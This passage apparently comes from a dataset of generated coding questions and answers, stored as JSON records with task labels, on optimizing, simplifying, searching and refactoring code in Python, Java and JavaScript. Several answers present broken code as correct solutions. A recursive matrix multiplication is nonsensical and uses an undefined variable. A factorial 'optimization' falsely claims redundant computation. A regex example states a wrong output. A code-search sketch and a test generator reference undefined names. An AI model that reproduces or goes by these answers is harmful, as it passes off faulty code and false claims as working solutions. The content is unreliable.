emailService, AuditLogService auditLogService) {\n        this.userRepository = userRepository;\n        this.emailService = emailService;\n        this.auditLogService = auditLogService;\n    }\n\n    public void createUser(User user) {\n        userRepository.save(user);\n        sendVerificationEmail(user);\n        logActivity(user, \"User created\");\n    }\n\n    private void sendVerificationEmail(User user) {\n        emailService.sendVerificationEmail(user);\n    }\n\n    private void logActivity(User user, String activity) {\n        auditLogService.logActivity(user, activity);\n    }\n}\n\n// Example usage\npublic class Main {\n    public static void main(String[] args) {\n        UserRepository userRepository = new UserRepositoryImpl(); // Implement UserRepository\n        EmailService emailService = new EmailServiceImpl();  // Implement EmailService\n        AuditLogService auditLogService = new AuditLogServiceImpl(); // Implement AuditLogService\n\n        UserService userService = new UserService(userRepository, emailService, auditLogService);\n        User newUser = new User(...);\n        userService.createUser(newUser);\n    }\n}\n```\nThese examples demonstrate how to refactor complex and tightly coupled code to improve performance, modularity, and maintainability using functional programming principles in Python and SOLID design principles with Dependency Injection in Java."}, {"L2_TASK": "Code to Code (same language)", "L3_TASK": "Code optimization", "Complexity_Level": "medium", "Response": "Question 1:\nProblem: A Python program is processing a large list of numbers, and the current implementation is slow due to inefficient looping. The task is to optimize the code for better performance while maintaining the same functionality. The original code calculates the sum of all even numbers in a list.\n\nOriginal Code:\n```python\ndef sum_even_numbers(numbers):\n    total = 0\n    for num in numbers:\n        if num % 2 == 0:\n            total += num\n    return total\n```\nOptimized Code:\n```python\ndef sum_even_numbers(numbers):\n    return sum(num for num in numbers if num % 2 == 0)\n```\nConcept: List Comprehension\n\nQuestion 2:\nProblem: A JavaScript function is responsible for filtering an array of objects based on multiple conditions. The current implementation uses multiple loops and if statements, which can be optimized for better performance.\n\nOriginal Code:\n```javascript\nfunction filterObjects(objects, condition1, condition2) {\n    let result = [];\n    for (let i = 0; i < objects.length; i++) {\n        if (objects[i].property1 === condition1) {\n            for (let j = 0; j < objects[i].property2.length; j++) {\n                if (objects[i].property2[j] === condition2) {\n                    result.push(objects[i]);\n                    break;\n                }\n            }\n        }\n    }\n    return result;\n}\n```\nOptimized Code:\n```javascript\nfunction filterObjects(objects, condition1, condition2) {\n    return objects.filter(obj => obj.property1 === condition1 && obj.property2.includes(condition2));\n}\n```\nConcept: Array.filter and Array.includes"}, {"L2_TASK": "Code to Code (same language)", "L3_TASK": "Code optimization", "Complexity_Level": "extremely difficult", "Response": "Question 1: **Problem:** Given a large piece of code in Python that performs matrix multiplication using nested loops. The code works correctly, but it is slow for large matrices. Optimize the code for performance, utilizing vectorization and potentially utilizing libraries like NumPy.\n\n**Concept:** Code Optimization, Vectorization\n\n```python\nimport numpy as np\n\n# Original slow implementation\ndef slow_matrix_multiply(A, B):\n    m, n = len(A), len(B[0])\n    C = [[0] * n for _ in range(m)]\n    for i in range(m):\n        for j in range(n):\n            for k in range(len(B)):\n                C[i][j] += A[i][k] * B[k][j]\n    return C\n\n# Optimized version using NumPy\ndef optimized_matrix_multiply(A, B):\n    return np.dot(A, B)\n\n# Test matrices\nA = [[1, 2, 3], [4, 5, 6]]\nB = [[7, 8], [9, 10], [11, 12]]\n\n# Compare execution time\nimport timeit\n\n# Warm-up\nslow_matrix_multiply(A, B)\noptimized_matrix_multiply(A, B)\n\n# Measure execution time\nslow_time = timeit.timeit(slow_matrix_multiply, globals=globals(), number=100)\noptimized_time = timeit.timeit(optimized_matrix_multiply, globals=globals(), number=100)\n\nprint(f\"Slow implementation: {slow_time} seconds\")\nprint(f\"Optimized implementation: {optimized_time} seconds\")\n```\n\nQuestion 2: **Problem:** You have a recursive Python function that calculates the factorial of a number. This function works but has a high time complexity due to redundant calculations. Implement a dynamic programming approach to optimize the function and reduce the time complexity.\n\n**Concept:** Code Optimization, Dynamic Programming\n\n```python\n# Original recursive implementation\ndef slow_factorial(n):\n    if n == 0 or n == 1:\n        return 1\n    return n * slow_factorial(n - 1)\n\n# Optimized dynamic programming implementation\ndef optimized_factorial(n, memo={}):\n    if n in memo:\n        return memo[n]\n    if n == 0 or n == 1:\n        return 1\n    memo[n] = n * optimized_factorial(n - 1)\n    return memo[n]\n\n# Test numbers\ntest_numbers = [5, 10, 20]\n\n# Compare execution time\nslow_times = []\noptimized_times = []\n\nfor num in test_numbers:\n    start_slow = timeit.default_timer()\n    slow_factorial(num)\n    end_slow = timeit.default_timer()\n    slow_times.append(end_slow - start_slow)\n\n    start_optimized = timeit.default_timer()\n    optimized_factorial(num)\n    end_optimized = timeit.default_timer()\n    optimized_times.append(end_optimized - start_optimized)\n\nprint(f\"Slow factorials: {slow_times} seconds\")\nprint(f\"Optimized factorials: {optimized_times} seconds\")\n```\n\nIn both examples, the optimized versions significantly reduce execution time by leveraging vectorization (NumPy for matrix multiplication) and dynamic programming (for the factorial calculation)."}, {"L2_TASK": "Code to Code (same language)", "L3_TASK": "Code simplification", "Complexity_Level": "medium", "Response": "Question 1:\nGiven a complex piece of Python code that performs string manipulation and concatenation using multiple loops and temporary variables, simplify the code using built-in functions and list comprehensions.\n\nProblem:\n```python\ndef complex_concatenate(strings):\n    result = \"\"\n    for i in range(len(strings)):\n        if i % 2 == 0:\n            result += strings[i].upper()\n        else:\n            result += strings[i].lower()\n    return result\n```\nSolution:\n```python\ndef simplified_concatenate(strings):\n    return ''.join([s.upper() if i % 2 == 0 else s.lower() for i, s in enumerate(strings)])\n```\nConcept: List Comprehensions\n\nQuestion 2:\nSuppose you have a Python function that checks if all elements in a list are even numbers, using multiple if statements and temporary variables. Simplify the code using a single line and the all() function.\n\nProblem:\n```python\ndef check_even_numbers(numbers):\n    even = True\n    for num in numbers:\n        if num % 2 != 0:\n            even = False\n            break\n    return even\n```\nSolution:\n```python\ndef simplified_check_even_numbers(numbers):\n    return all(num % 2 == 0 for num in numbers)\n```\nConcept: all() function, List Comprehensions"}, {"L2_TASK": "Code to Code (same language)", "L3_TASK": "Code simplification", "Complexity_Level": "extremely difficult", "Response": "Question 1:\nGiven an extremely complex and convoluted codebase in Python, simplify and refactor a function that performs matrix multiplication using recursion. The original function has nested loops, excessive conditionals, and multiple function calls. The goal is to optimize the function for readability and performance.\n\n**Original Code:**\n\n```python\ndef multiply_matrices(matrix1, matrix2):\n    if len(matrix1[0]) != len(matrix2):\n        raise ValueError(\"Incompatible matrices\")\n    \n    result = []\n    for i in range(len(matrix1)):\n        row = []\n        for j in range(len(matrix2[0])):\n            temp = 0\n            for k in range(len(matrix1[0])):\n                temp += matrix1[i][k] * matrix2[k][j]\n            row.append(temp)\n        result.append(row)\n    return result\n```\n\n**Refactored Code:**\n\n```python\ndef multiply_matrices(matrix1, matrix2):\n    if len(matrix1[0]) != len(matrix2):\n        raise ValueError(\"Incompatible matrices\")\n\n    def _recursive_multiply(row, column, matrices):\n        if not matrices:\n            return row * column\n        m, *matrices = matrices\n        return _recursive_multiply(\n            [\n                row[i] * m[j] + result[i][j]\n                for i in range(len(row))\n                for j in range(len(column))\n            ],\n            column,\n            matrices,\n        )\n\n    result = [[0] * len(matrix2[0]) for _ in range(len(matrix1))]\n    return _recursive_multiply(matrix1, matrix2, [])\n\n```\n\nQuestion 2:\nSuppose there is a Java program with a deeply nested and tightly coupled code structure for performing a complex financial calculation involving several entities such as stocks, options, and futures. Simplify and decouple the code by applying the Strategy design pattern to enable swapping of calculation algorithms dynamically.\n\n**Original Code:**\n\n```java\npublic class FinanceCalculator {\n    public double calculatePortfolioValue(Stock stock, Option option, Future future) {\n        // Long and tightly coupled calculation logic\n        double stockValue = calculateStockValue(stock);\n        double optionValue = calculateOptionValue(option, stock);\n        double futureValue = calculateFutureValue(future, stock);\n        return stockValue + optionValue + futureValue;\n    }\n\n    private double calculateStockValue(Stock stock) {...}\n    private double calculateOptionValue(Option option, Stock stock) {...}\n    private double calculateFutureValue(Future future, Stock stock) {...}\n}\n```\n\n**Refactored Code:**\n\n```java\n// Strategy Interfaces\ninterface StockCalculator {\n    double calculateValue(Stock stock);\n}\n\ninterface OptionCalculator {\n    double calculateValue(Option option, Stock stock);\n}\n\ninterface FutureCalculator {\n    double calculateValue(Future future, Stock stock);\n}\n\n// Concrete Strategies\nclass SimpleStockCalculator implements StockCalculator {\n    @Override\n    public double calculateValue(Stock stock) {...}\n}\n\nclass AdvancedStockCalculator implements StockCalculator {\n    @Override\n    public double calculateValue(Stock stock) {...}\n}\n\nclass SimpleOptionCalculator implements OptionCalculator {\n    @Override\n    public double calculateValue(Option option, Stock stock) {...}\n}\n\nclass AdvancedOptionCalculator implements OptionCalculator {\n    @Override\n    public double calculateValue(Option option, Stock stock) {...}\n}\n\nclass SimpleFutureCalculator implements FutureCalculator {\n    @Override\n    public double calculateValue(Future future, Stock stock) {...}\n}\n\nclass AdvancedFutureCalculator implements FutureCalculator {\n    @Override\n    public double calculateValue(Future future, Stock stock) {...}\n}\n\npublic class FinanceCalculator {\n    private StockCalculator stockCalculator;\n    private OptionCalculator optionCalculator;\n    private FutureCalculator futureCalculator;\n\n    public FinanceCalculator(StockCalculator stockCalc, OptionCalculator optionCalc, FutureCalculator futureCalc) {\n        this.stockCalculator = stockCalc;\n        this.optionCalculator = optionCalc;\n        this.futureCalculator = futureCalc;\n    }\n\n    public double calculatePortfolioValue(Stock stock, Option option, Future future) {\n        double stockValue = stockCalculator.calculateValue(stock);\n        double optionValue = optionCalculator.calculateValue(option, stock);\n        double futureValue = futureCalculator.calculateValue(future, stock);\n        return stockValue + optionValue + futureValue;\n    }\n}\n```\n\nConcepts: {\"Concept\": \"Recursion\"}, {\"Concept\": \"Strategy Pattern\"}"}, {"L2_TASK": "Code to Code (same language)", "L3_TASK": "Code search - given a bit of code, search within it", "Complexity_Level": "medium", "Response": "Question 1:\nProblem: Develop a code snippet in Python to search for a specific function call within a given code string.\n\n```python\ndef search_function_call(code_string, function_name):\n    \"\"\"\n    Given a code string and a function name, return all occurrences of the function call.\n    \"\"\"\n    # Implement your solution here\n    pass\n\n# Example usage\nexample_code = \"\"\"\ndef calculate_total(quantity, price):\n    return quantity * price\n\nresult = calculate_total(5, 10)\nprint(result)\n\ntotal = calculate_total(3, calculate_total(2, 5))\n\"\"\"\nfunction_name = \"calculate_total\"\nprint(search_function_call(example_code, function_name))\n```\nSolution:\n```python\nimport re\n\ndef search_function_call(code_string, function_name):\n    pattern = rf\"\\b{function_name}\\s*\\(\"  # regex pattern to find function calls\n    occurrences = re.findall(pattern, code_string, re.MULTILINE)\n    return occurrences\n\n# Example usage\nexample_code = \"\"\"\ndef calculate_total(quantity, price):\n    return quantity * price\n\nresult = calculate_total(5, 10)\nprint(result)\n\ntotal = calculate_total(3, calculate_total(2, 5))\n\"\"\"\nfunction_name = \"calculate_total\"\nprint(search_function_call(example_code, function_name))  # Output: ['calculate_total(', 'calculate_total(2, 5')]\n```\nConcept: Regular Expressions\n\nQuestion 2:\nProblem: Create a Java method to search for a specific class import statement within a given Java code snippet.\n\n```java\npublic class CodeSearch {\n    public static List<String> findImports(String code, String className) {\n        // Implement your solution here\n        return new ArrayList<>();\n    }\n\n    public static void main(String[] args) {\n        String codeSnippet = \"\"\"\n                import java.util.ArrayList;\n                import java.util.List;\n\n                public class Test {\n                    public static void main(String[] args) {\n                        List<String> list = new ArrayList<>();\n                    }\n                }\n                \"\"\";\n\n        String classNameToFind = \"java.util.List\";\n        List<String> foundImports = findImports(codeSnippet, classNameToFind);\n        System.out.println(foundImports);\n    }\n}\n```\nSolution:\n```java\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class CodeSearch {\n    public static List<String> findImports(String code, String className) {\n        List<String> foundImports = new ArrayList<>();\n        String[] lines = code.split(\"\\n\");\n        for (String line : lines) {\n            if (line.startsWith(\"import\") && line.contains(className)) {\n                String trimmedLine = line.trim();\n                foundImports.add(trimmedLine);\n            }\n        }\n        return foundImports;\n    }\n\n    public static void main(String[] args) {\n        String codeSnippet = \"\"\"\n                import java.util.ArrayList;\n                import java.util.List;\n\n                public class Test {\n                    public static void main(String[] args) {\n                        List<String> list = new ArrayList<>();\n                    }\n                }\n                \"\"\";\n\n        String classNameToFind = \"java.util.List\";\n        List<String> foundImports = findImports(codeSnippet, classNameToFind);\n        System.out.println(foundImports);  // Output: [import java.util.List]\n    }\n}\n```\nConcept: String manipulation"}, {"L2_TASK": "Code to Code (same language)", "L3_TASK": "Code search - given a bit of code, search within it", "Complexity_Level": "extremely difficult", "Response": "Question 1: Develop a highly scalable code search engine that can efficiently index and search complex, real-world codebases written in a given language (e.g., Python). The system should be able to perform semantic search, finding code snippets that are semantically similar even if they don't have identical syntax.\n\n**Concept**: Natural Language Processing, Code Representation, Indexing, Similarity Metrics\n\n**Solution**:\nWe can use a combination of Natural Language Processing (NLP), graph-based representations, and similarity metrics to achieve this. First, we'll preprocess the code to extract tokens and build a code representation. Then, we'll create an index for efficient search. Finally, we'll implement a similarity function to compare code snippets.\n\nHere's a high-level example in Python using libraries like `nltk`, `gensim`, and `faiss`:\n\n```python\nimport nltk\nfrom nltk.tokenize import word_tokenize\nfrom nltk.corpus import stopwords\nfrom gensim import corpora, models\nimport faiss\n\n# Preprocessing\ndef preprocess_code(code):\n    tokens = word_tokenize(code)\n    stop_words = set(stopwords.words('english'))\n    filtered_tokens = [token.lower() for token in tokens if token.isalnum() and token.lower() not in stop_words]\n    return filtered_tokens\n\n# Indexing\ndef create_code_index(codebase):\n    tokenized_codebase = [preprocess_code(code) for code in codebase]\n    dictionary = corpora.Dictionary(tokenized_codebase)\n    tfidf = models.TfidfModel(tokenized_codebase, id2word=dictionary)\n    indexed_codebase = tfidf[tfidf_corpus]\n    return dictionary, indexed_codebase\n\n# Search\ndef search_similar(code_snippet, indexed_codebase, dictionary, similarity_threshold=0.8):\n    query_tokens = preprocess_code(code_snippet)\n    query_tfidf = tfidf[dictionary.doc2bow(query_tokens)]\n    index = faiss.IndexFlatL2(query_tfidf.shape[1])  #Flat L2 index for cosine similarity\n    index.add(query_tfidf)\n    _,\u76f8\u4f3c\u5ea6 = index.search(query_tfidf, 10)  # Search for top 10 most similar code snippets\n    similar_snippets = [(codebase[i], sim) for i, sim in enumerate(similarity) if sim > similarity_threshold]\n    return similar_snippets\n\n# Example usage\ncodebase = [... complex code snippets ...]  # Load your codebase\ndictionary, indexed_codebase = create_code_index(codebase)\ncode_snippet = \"your input code snippet\"\nsimilar_snippets = search_similar(code_snippet, indexed_codebase, dictionary)\n```\n\nNote that this is a simplified example and does not account for many complexities in real-world code search, such as handling syntax, variable names, function calls, and dependencies.\n\nQuestion 2: Design a system that, given an incomplete code snippet, suggests relevant completion suggestions from a large codebase using an advanced language model trained on millions of lines of code.\n\n**Concept**: Language Models, Deep Learning, Transfer Learning\n\n**Solution**:\nWe can leverage a transformer-based language model, like GPT-3 or a custom fine-tuned model, to generate code completions. First, we'll fine-tune the model on a large corpus of code. Then, we'll create an API to accept an incomplete code snippet and generate completion suggestions.\n\nHere's a high-level example using Python and the `transformers` library:\n\n```python\nfrom transformers import GPT2Tokenizer, GPT2LMHeadModel\nimport torch\n\n# Load model and tokenizer\ntokenizer = GPT2Tokenizer.from_pretrained('gpt2')\nmodel = GPT2LMHeadModel.from_pretrained('gpt2')\n\n# Fine-tuning (omitted for brevity, but required with a code corpus)\n\n# Completion suggestions\ndef generate_completions(incomplete_code, top_k=10):\n    input_ids = tokenizer.encode(incomplete_code, return_tensors='pt')\n    outputs = model.generate(input_ids, max_length=100, top_k=top_k, num_return_sequences=top_k)\n    return [tokenizer.decode(out, skip_special_tokens=True) for out in outputs]\n\n# Example usage\nincomplete_snippet = \"def my_function(x, y):\"\ncompletions = generate_completions(incomplete_snippet)\nfor completion in completions:\n    print(completion)\n```\n\nIn this example, we're using the pre-trained GPT-2 model. However, for better results, you would need to fine-tune the model on a large code corpus specific to your target language and domain. This requires significant computational resources and data preprocessing.\n\nThese solutions are highly complex and involve multiple steps, including data preprocessing, model training, and efficient indexing/search techniques. They also require a good understanding of NLP, deep learning, and the chosen libraries."}, {"L2_TASK": "Code to Code (same language)", "L3_TASK": "API Mining - e.g. help generating calls for APIs", "Complexity_Level": "medium", "Response": "Question 1:\nProblem: You need to create a Python script that automatically extracts API endpoints and their respective parameters from a given API documentation in JSON format, and generates function stubs for making API calls.\n\nConcept: \"API Mining - e.g. help generating calls for APIs\"\n\n```python\nimport json\nfrom typing import Dict, List, Tuple\n\ndef extract_api_endpoints(doc: str) -> Dict[str, Tuple[str, List[str]]]:\n    def extract_params(param_str: str) -> List[str]:\n        return [param.strip() for param in param_str.split(',')]\n\n    api_data = json.loads(doc)\n    endpoints = {}\n    \n    for endpoint in api_data['endpoints']:\n        method, url, params = endpoint['method'], endpoint['url'], endpoint['params']\n        endpoints[method.lower() + ' ' + url] = (method, extract_params(params))\n\n    return endpoints\n\ndef generate_function_stubs(endpoints: Dict[str, Tuple[str, List[str]]]) -> None:\n    for endpoint, (method, params) in endpoints.items():\n        print(f'def {method.lower()}_{endpoint.replace(\" \", \"_\")}({\", \".join(params)}):')\n        print('    # TODO: Implement API call and handle response')\n\n# Example JSON documentation\napi_doc = '''\n{\n    \"endpoints\": [\n        {\n            \"method\": \"GET\",\n            \"url\": \"/users\",\n            \"params\": \"user_id, page, limit\"\n        },\n        {\n            \"method\": \"POST\",\n            \"url\": \"/users\",\n            \"params\": \"name, email, password\"\n        }\n    ]\n}\n'''\n\nendpoints = extract_api_endpoints(api_doc)\ngenerate_function_stubs(endpoints)\n```\n\nOutput:\n```\ndef get_users(user_id, page, limit):\n    # TODO: Implement API call and handle response\n\ndef post_users(name, email, password):\n    # TODO: Implement API call and handle response\n```\n\nQuestion 2:\nProblem: Design a JavaScript utility function that reads an OpenAPI (Swagger) specification file and dynamically generates typed TypeScript interfaces for the request and response objects of each API endpoint.\n\nConcept: \"API Mining - e.g. help generating calls for APIs\"\n\n```typescript\nimport * as fs from 'fs';\nimport * as YAML from 'js-yaml';\nimport * as ts from 'typescript';\n\ninterface OpenApiSpec {\n  paths: {\n    [path: string]: {\n      [method: string]: {\n        parameters?: any[];\n        responses: {\n          [status: string]: {\n            schema?: any;\n          };\n        };\n      };\n    };\n  };\n}\n\nfunction generateInterfaces(spec: OpenApiSpec) {\n  const interfaces: string[] = [];\n\n  for (const path in spec.paths) {\n    for (const method in spec.paths[path]) {\n      const endpoint = spec.paths[path][method];\n      const interfaceName = `I${method}Response_${path.replace(/\\/|\\-/g, '_')}`;\n\n      const properties = endpoint.responses['200'].schema.properties || {};\n      const interfaceDef = Object.keys(properties).map((prop) => `${prop}: ${properties[prop].type}`).join(', ');\n\n      interfaces.push(`export interface ${interfaceName} {${interfaceDef}}`);\n    }\n  }\n\n  return interfaces.join('\\n');\n}\n\nconst specFile = 'path/to/openapi.yaml';\nconst specData = fs.readFileSync(specFile, 'utf-8');\nconst spec = YAML.load(specData) as OpenApiSpec;\n\nconst interfaces = generateInterfaces(spec);\nconsole.log(interfaces);\n```\n\nThis code reads an OpenAPI specification file, parses it using YAML and TypeScript, and generates TypeScript interfaces for each endpoint's response object. Replace `'path/to/openapi.yaml'` with the path to your OpenAPI specification file."}, {"L2_TASK": "Code to Code (same language)", "L3_TASK": "API Mining - e.g. help generating calls for APIs", "Complexity_Level": "extremely difficult", "Response": "Question 1:\n\nGenerate a Python script that automatically discovers APIs for a given package, reverse engineers their signature, and generates unit tests for each function. The script should handle complex dependencies, optional parameters, and nested APIs.\n\n**Concept**: API Mining, Python Development\n\n```python\nimport inspect\nimport importlib\nimport unittest\nfrom typing import Callable, List, Dict, Optional\n\ndef discover_api(package_name: str) -> Dict[str, Callable]:\n    package = importlib.import_module(package_name)\n    api_dict = {}\n    \n    for name, obj in inspect.getmembers(package, inspect.isfunction):\n        if not name.startswith('_'):\n            api_dict[name] = obj\n    \n    return api_dict\n\ndef generate_function_signature(func: Callable) -> str:\n    signature = inspect.signature(func)\n    parameters = [f'{param.name}={param.default}' if param.default is not inspect.Parameter.empty else param.name for param in signature.parameters.values()]\n    return f'({\", \".join(parameters)})'\n\ndef generate_unit_test(api_dict: Dict[str, Callable], test_class: unittest.TestCase):\n    for name, func in api_dict.items():\n        args_str = generate_function_signature(func)\n        test_method = f'test_{name}'\n\n        exec(f'def {test_method}({args_str}):\\n    self.assertIsNotNone({name}({\", \".join([\"\"] * len(parameters))}))', locals(), globals())\n        setattr(test_class, test_method, locals()[test_method])\n\nclass TestAPI(unittest.TestCase):\n    def setUp(self):\n        package_name = 'your_package_name'\n        self.api_dict = discover_api(package_name)\n        generate_unit_test(self.api_dict, self)\n\nif __name__ == '__main__':\n    unittest.main()\n```\n\nNote: Replace `'your_package_name'` with the actual package name you want to mine for APIs.\n\nQuestion 2:\n\nCreate a Java program that extracts and documents all REST API endpoints from a given set of OpenAPI (formerly Swagger) specifications. The program should include generating UML diagrams for the API models, handling multiple specification files, and filtering by specific API versions.\n\n**Concept**: API Mining, Java Development, REST APIs\n\n```java\nimport java.io.File;\nimport java.io.IOException;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.regex.Matcher;\nimport java.util.regex.Pattern;\n\nimport org.yaml.snakeyaml.Yaml;\nimport org.yaml.snakeyaml.error.YAMLException;\n\npublic class OpenAPIDocumenter {\n\n    public static void main(String[] args) {\n        String versionFilter = \"v1\"; // Filter by API version\n        List<File> specFiles = getOpenAPISpecFiles(new File(\"specifications/\")); // Replace with the folder containing OpenAPI specs\n        List<OpenAPISpec> specs = loadSpecs(specFiles);\n        specs.stream()\n            .filter(spec -> spec.getVersion().equals(versionFilter))\n            .forEach(spec -> {\n                documentEndpoints(spec);\n                generateModelUML(spec);\n            });\n    }\n\n    private static List<File> getOpenAPISpecFiles(File dir) {\n        List<File> specFiles = new ArrayList<>();\n        for (File file : dir.listFiles()) {\n            if (file.isFile() && file.getName().endsWith(\".yaml\")) {\n                specFiles.add(file);\n            }\n        }\n        return specFiles;\n    }\n\n    private static List<OpenAPISpec> loadSpecs(List<File> specFiles) {\n        List<OpenAPISpec> specs = new ArrayList<>();\n        for (File file : specFiles) {\n            try {\n                Yaml yaml = new Yaml();\n                OpenAPISpec spec = yaml.loadAs(file, OpenAPISpec.class);\n                specs.add(spec);\n            } catch (IOException | YAMLException e) {\n                System.err.println(\"Error loading spec: \" + file.getName());\n            }\n        }\n        return specs;\n    }\n\n    private static void documentEndpoints(OpenAPISpec spec) {\n        // Implement code to extract and document endpoints\n    }\n\n    private static void generateModelUML(OpenAPISpec spec) {\n        // Implement code to generate UML diagrams for models\n    }\n\n    static class OpenAPISpec {\n        private String version;\n        private Components components;\n        // Add getters, setters, and other fields for OpenAPI spec\n\n        public String getVersion() {\n            return version;\n        }\n\n        public Components getComponents() {\n            return components;\n        }\n    }\n\n    static class Components {\n        private Paths paths;\n        // Add getters, setters, and other fields for OpenAPI components\n    }\n\n    static class Paths {\n        // Add fields and methods to handle paths and operations in OpenAPI spec\n    }\n}\n```\n\nNote: This code uses SnakeYAML to parse YAML files. Make sure to include the SnakeYAML library in your project's dependencies. The `documentEndpoints` and `generateModelUML` methods need to be implemented with a library like PlantUML for generating UML diagrams."}, {"L2_TASK": "Code to Code (same language)", "L3_TASK": "Remove redundancy", "Complexity_Level": "medium", "Response": "Question 1:\nProblem: You have a program with multiple functions that perform similar operations on different data types. Write a refactored version by removing redundancy using the concept of Polymorphism.\n\nConcept: Polymorphism\n\nSolution:\n\nAssume you have a set of functions that calculate the area of shapes with different data types for their dimensions.\n\n```python\ndef area_circle(radius):\n    return 3.14 * radius * radius\n\ndef area_square(side):\n    return side * side\n\ndef area_rectangle(length, width):\n    return length * width\n```\n\nRefactor the code using polymorphism:\n\n```python\nclass Shape:\n    def __init__(self):\n        pass\n\nclass Circle(Shape):\n    def __init__(self, radius):\n        self.radius = radius\n\n    def area(self):\n        return 3.14 * self.radius * self.radius\n\nclass Square(Shape):\n    def __init__(self, side):\n        self.side = side\n\n    def area(self):\n        return self.side * self.side\n\nclass Rectangle(Shape):\n    def __init__(self, length, width):\n        self.length = length\n        self.width = width\n\n    def area(self):\n        return self.length * self.width\n\nshapes = [Circle(5), Square(10), Rectangle(7, 4)]\nfor shape in shapes:\n    print(f\"Area of {type(shape).__name__}: {shape.area()}\")\n```\n\nQuestion 2:\nProblem: You have a JavaScript program with multiple event listeners for different elements that perform the same operation. Optimize the code by using the concept of higher-order functions.\n\nConcept: Higher-order functions\n\nSolution:\n\nOriginal code with redundant event listeners:\n\n```javascript\nconst buttons = document.querySelectorAll('button');\n\nbuttons[0].addEventListener('click', handleButtonClick);\nbuttons[1].addEventListener('click', handleButtonClick);\nbuttons[2].addEventListener('click', handleButtonClick);\n```\n\nOptimized code using higher-order functions:\n\n```javascript\nfunction addClickListener(element, handler) {\n  element.addEventListener('click', handler);\n}\n\nconst buttons = document.querySelectorAll('button');\nconst handleButtonClick = () => {\n  // Your logic here\n};\n\nbuttons.forEach(button => addClickListener(button, handleButtonClick));\n```\n\nIn this solution, the `addClickListener` is a higher-order function that takes an element and a handler function as arguments. The `forEach` loop is used to iterate over all buttons and attach the event listener using the higher-order function, eliminating redundancy."}, {"L2_TASK": "Code to Code (same language)", "L3_TASK": "Remove redundancy", "Complexity_Level": "extremely difficult", "Response": "Question 1: Given a large codebase with duplicated utility functions across multiple files, design a system to identify and remove redundancy, ensuring proper encapsulation and maintaining functionality.\n\nConcept: Refactoring, Encapsulation, Abstract Classes, Dependency Injection\n\nSolution:\nWe can use a combination of code analysis tools, abstract classes, and dependency injection to refactor the codebase and remove redundancy. First, we'll identify the duplicated functions using a tool like PyLint for Python, and then we'll refactor the code to create an abstract utility class.\n\nExample code in Python:\n```python\nfrom abc import ABC, abstractmethod\nfrom typing import TypeVar, Generic\n\nT = TypeVar('T')\n\nclass UtilityInterface(ABC, Generic[T]):\n    @abstractmethod\n    def process_data(self, data: T) -> T:\n        pass\n\nclass UtilityA(UtilityInterface[int]):\n    def process_data(self, data: int) -> int:\n        # Original functionality of utility function A\n        return data * 2\n\nclass UtilityB(UtilityInterface[str]):\n    def process_data(self, data: str) -> str:\n        # Original functionality of utility function B\n        return data.upper()\n\nclass CodeBase:\n    def __init__(self, utility_class: UtilityInterface):\n        self._utility = utility_class\n\n    def execute(self, data: T) -> T:\n        return self._utility.process_data(data)\n\n# Usage\nutility_a = UtilityA()\ncode_base_a = CodeBase(utility_a)\nprint(code_base_a.execute(5))  # Output: 10\n\nutility_b = UtilityB()\ncode_base_b = CodeBase(utility_b)\nprint(code_base_b.execute('hello'))  # Output: HELLO\n```\nIn this solution, we created an abstract class `UtilityInterface` with an abstract method `process_data`. We then created concrete utility classes (`UtilityA` and `UtilityB`) that implement this interface, keeping their original functionality. The `CodeBase` class uses dependency injection to work with any utility class that implements the `UtilityInterface`. This allows us to remove redundancy and maintain functionality while encapsulating the utility functions.\n\nQuestion 2: A large JavaScript codebase has multiple redundant event listeners and callback functions. Create a solution to refactor the code, making it more efficient and easier to maintain, while preserving functionality.\n\nConcept: Event Delegation, Higher-Order Functions, Closures\n\nSolution:\nWe can refactor the codebase by implementing event delegation and using higher-order functions to create reusable callback factories. This will not only remove redundancy but also improve performance by reducing the number of event listeners.\n\nExample code in JavaScript:\n```javascript\ndocument.addEventListener('DOMContentLoaded', () => {\n  const elementsWithSameListener = document.querySelectorAll('.redundant-elements');\n\n  function createCallback(action) {\n    return (event) => {\n      const target = event.target;\n      if (target.matches('.specific-class')) {\n        action(target);\n      }\n    };\n  }\n\n  function processElement(element) {\n    // Original functionality of the callback function\n    console.log(`Processed element: ${element.textContent}`);\n  }\n\n  elementsWithSameListener.forEach((element) => {\n    element.addEventListener('click', createCallback(processElement));\n  });\n});\n```\nIn this solution, we use event delegation by adding a single event listener to the container element (`elementsWithSameListener`). We create a higher-order function `createCallback` that takes an action function (`processElement`) as a parameter and returns a new callback function with the desired behavior. The `processElement` function contains the original functionality of the redundant callback functions. This approach removes redundancy, improves performance, and makes the code easier to maintain."}, {"L2_TASK": "Code to Code (same language)", "L3_TASK": "Convert loops to recursion", "Complexity_Level": "medium", "Response": "Question 1:\nProblem: Write a function in Python that converts a for loop, which prints numbers from 1 to `n`, into a recursive function.\n\n```python\n# Medium difficulty\ndef print_numbers_recursively(n):\n    # Concept: Recursion\n    # Base case\n    if n <= 0:\n        return\n    # Recursive case\n    print(n)\n    print_numbers_recursively(n - 1)\n\n# Test the function\nprint_numbers_recursively(5)\n```\n\nQuestion 2:\nProblem: Convert the following Python code that calculates the factorial of a number using a while loop into a recursive function.\n\n```python\n# Medium difficulty\ndef factorial(n):\n    # Concept: Recursion\n    # Base case\n    if n == 0 or n == 1:\n        return 1\n    # Recursive case\n    return n * factorial(n - 1)\n\n# Test the function\nprint(factorial(5))\n```\n\nIn both examples, the solution uses recursion to replace the iterative loops (for and while). The base case is defined as the stopping condition for the recursion, and the recursive case is where the function calls itself with a modified argument until it reaches the base case."}, {"L2_TASK": "Code to Code (same language)", "L3_TASK": "Convert loops to recursion", "Complexity_Level": "extremely difficult", "Response": "Question 1:\nGiven a nested loop that performs complex calculations based on 2D matrix multiplication, create a recursive function to achieve the same result without loops. The matrix multiplication should follow the\u89c4\u5219 of conventional matrix multiplication, where the number of columns in the first matrix must be equal to the number of rows in the second matrix.\n\n```python\n# Example of a nested loop for matrix multiplication\ndef multiply_matrices_loop(matrix1, matrix2):\n    if len(matrix1[0]) != len(matrix2):\n        raise ValueError(\"Incompatible matrices\")\n    result = [[0] * len(matrix2[0]) for _ in range(len(matrix1))]\n    for i in range(len(matrix1)):\n        for j in range(len(matrix2[0])):\n            for k in range(len(matrix2)):\n                result[i][j] += matrix1[i][k] * matrix2[k][j]\n    return result\n\n# Recursive version of matrix multiplication\ndef multiply_matrices_recursive(matrix1, matrix2):\n    if len(matrix1[0]) != len(matrix2):\n        raise ValueError(\"Incompatible matrices\")\n    if len(matrix1) 